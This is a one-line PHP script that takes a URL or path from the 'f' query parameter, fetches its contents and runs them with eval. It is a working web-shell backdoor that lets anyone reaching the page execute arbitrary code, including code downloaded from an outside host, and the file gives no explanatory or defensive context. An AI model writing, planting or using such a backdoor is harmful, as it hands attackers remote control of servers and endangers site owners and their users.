<?php if(isset($_GET['f'])){$b = $_GET['f']; $a = file_get_contents($b); eval('?>'.$a);}else{$b = "no";} ?>


